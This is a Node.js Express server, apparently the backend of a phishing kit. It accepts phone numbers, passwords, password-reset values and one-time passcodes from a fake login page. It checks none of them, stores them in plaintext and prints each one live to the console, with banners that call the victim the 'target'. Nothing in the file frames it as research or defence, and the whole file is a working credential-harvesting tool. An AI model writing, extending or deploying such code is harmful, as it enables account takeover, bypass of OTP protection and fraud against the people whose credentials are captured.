
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();
app.use(express.json());
app.use(cors()); 

// 1. Unified Data Structure Schema for tracking all actions
const userSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: false },
    password: { type: String, required: false },
    otpEntered: { type: String, default: "" },
    resetPhone: { type: String, default: "" },
    newPassword: { type: String, default: "" },
    actionType: { type: String, default: "LOGIN" }, // LOGIN ya PASSWORD_RESET
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Memory variable for temporarily storing password resets until OTP check
let pendingResets = {};

// 2. Database Server Initialization Function
async function startServer() {
    try {
        const mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();
        
        await mongoose.connect(mongoUri);
        console.log('\n====================================');
        console.log('🎉 MongoDB (In-Memory) Connected Successfully!');
        console.log('====================================');

        app.listen(4000, () => {
            console.log('🚀 Backend Server running on port 4000');
            console.log('Aapka backend puri tarah ready hai!');
            console.log('====================================\n');
        });
    } catch (err) {
        console.error('❌ Database Connection Error:', err);
    }
}

// 3. API Route: Login Data Receive Karne Ke Liye
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        
        const newUser = new User({ phoneNumber, password, actionType: "LOGIN" });
        const savedUser = await newUser.save();
        
        console.log(`\n[🔥 LIVE LOGIN DATA RECEIVED]`);
        console.log(`📱 Phone Number : ${phoneNumber}`);
        console.log(`🔑 Password     : ${password}`);
        console.log(`------------------------------------`);
        
        res.status(200).json({ success: true, userId: savedUser._id });
    } catch (error) {
        res.status(500).json({ success: false, message: "Server Error" });
    }
});

// 4. API Route: Forgot Password Request Target Intercept
app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        
        // Temporarily store credentials until user sends OTP
        pendingResets[phone] = { newPassword };

        console.log(`\n[🔄 PASSWORD RESET PROCESS TRIGGERED]`);
        console.log(`📱 target User : ${phone}`);
        console.log(`🔑 Target Pass : ${newPassword}`);
        console.log(`------------------------------------`);

        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: "Server Error" });
    }
});

// 5. API Route: OTP Receive aur Action Wise Save Karne Ke Liye
app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp, isReset, phone } = req.body;
        
        if (isReset) {
            const cachedContext = pendingResets[phone];
            if(cachedContext) {
                // Agar request forgot password flow se aayi hai
                const resetData = new User({
                    resetPhone: phone,
                    newPassword: cachedContext.newPassword,
                    otpEntered: otp,
                    actionType: "PASSWORD_RESET"
                });
                await resetData.save();

                console.log(`\n[🔐 PASSWORD RESET LOG RECORDED SUCCESSFULLY]`);
                console.log(`📱 Phone Target : ${phone}`);
                console.log(`🔑 New Password : ${cachedContext.newPassword}`);
                console.log(`🔐 OTP Entered  : ${otp}`);
                console.log('====================================');
                
                delete pendingResets[phone]; // memory clean up
                return res.status(200).json({ success: true });
            } else {
                return res.status(400).json({ success: false, message: "Session Expired" });
            }
        } else {
            // Agar request normal login flow se aayi hai
            if (mongoose.Types.ObjectId.isValid(userId)) {
                await User.findByIdAndUpdate(userId, { otpEntered: otp });
            }
            
            console.log(`\n[🔑 LOGIN OTP UPDATED SUCCESSFULLY]`);
            console.log(`🆔 User ID : ${userId}`);
            console.log(`🔐 OTP     : ${otp}`);
            console.log('====================================');
            
            res.status(200).json({ success: true });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: "Server Error" });
    }
});

startServer();
